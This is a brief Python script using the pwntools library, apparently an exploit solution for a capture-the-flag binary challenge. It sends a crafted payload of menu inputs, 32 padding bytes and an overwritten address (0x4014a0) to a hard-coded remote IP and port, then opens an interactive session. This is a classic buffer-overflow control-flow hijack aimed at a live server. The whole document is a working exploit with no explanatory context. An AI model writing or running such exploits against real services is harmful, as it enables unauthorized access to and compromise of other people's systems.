from pwn import * 

payload = "1\n4\nasd\n1\n4\nasd\n2\n0\n" + "0"*32 + "\xa0\x14\x40\x00\x00\x00\x00\x00\n3\n1"
print(payload)
r = remote("103.185.38.238", 15733)
r.sendline(payload)
r.recv()
r.interactive()